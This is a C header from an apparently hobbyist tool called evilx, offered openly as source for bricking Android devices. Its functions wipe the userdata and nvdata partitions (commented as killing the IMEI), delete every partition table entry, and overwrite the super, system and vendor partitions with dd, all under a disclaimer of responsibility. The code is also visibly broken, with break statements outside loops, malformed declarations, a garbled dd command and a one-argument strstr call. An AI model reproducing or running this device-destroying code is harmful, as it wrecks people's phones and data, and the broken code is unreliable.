#ifndef _TOOLS_H_
#define _TOOLS_H_

// required headers
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <parted/parted.h>
#include <dirent.h>
#include <sys/stat.h>
#include <string.h>
#include <getopt.h>

/*

███████╗██╗   ██╗ ██╗██╗      ██╗  ██╗
██╔════╝██║   ██║ ██║██║      ╚██╗██╔╝
█████╗  ██║   ██║ ██║██║       ╚███╔╝ 
██╔══╝  ╚██╗ ██╔╝ ██║██║       ██╔██╗ 
███████╗ ╚████╔╝ ██║███████╗ ██╔╝ ██╗
╚══════╝  ╚═══╝   ╚═╝╚══════╝╚═╝  ╚═╝

By YZBruh

*/

/*
 * Copyright 2024 evilx
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at

 *     http://www.apache.org/licenses/LICENSE-2.0

 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

// I do not accept responsibility or responsibilities. The user or user is responsible for any serious damage that may occur!

// to damage the device without bricking it
const void no_brick() {
    // we will just clean it and kill the imei
    if (system("e2fsck -fp /dev/block/by-name/userdata") != 0) {
        error("The userdata could not be cleared!\n");
    } else if (system("e2fsck -fp /dev/block/by-name/nvdata") != 0) {
        error("The nvdata could not be cleared!\n");
    } else {
        printf(ASCI_COLOR_GREEN "Success\n" ASCI_COLOR_RESET);
    }
}

// that's it, it doesn't hurt!!!!!!!! it will ruin the partition table! in one word "scrap"
const void scrap(char* device_name) {
    PedDevice* device = ped_device_get(device_name);
    if (device == NULL) {
        int evilx_scrap_ecode = 1;
        break;
    }
    PedDisk* disk = ped_disk_new(device);
    if (disk == NULL) {
        int evilx_scrap_ecode = 1;
        ped_device_destroy(device);
        break;
    }
    for (int p_number = 0; p_number <= 90; p_number++) {
        if (ped_disk_delete_partition(disk, ped_disk_get_partition(disk, p_number))) {
            printf(ASCI_COLOR_GREEN "Partition number: %d.\n", ASCI_COLOR_RESET p_number);
        }
    }
    ped_disk_destroy(disk);
    ped_device_destroy(device);
}

// convenience is important
static const pt_cleaner(char *target_part) {
    char cmnd[100];
    snprintf(cmnd, sizeof(cmnd), "dd if=/dev/null /dev/block/by-name/%s", target_part);
    if (system(cmnd) != 0) {
        error("Failed!\n");
    }
}

// function for brick
const void brick() {
    if (evilx_pt_type == 1) {
        pt_cleaner("super");
    } else if (evilx_pt_type == 0) {
        pt_cleaner("system");
    }
    if (system("readlink -eq /dev/block/by-name/vendor") == 0) {
        pt_cleaner("vendor");
    }
    if (strstr(evilx_using_soc) != NULL) {
        
    }
}

#endif
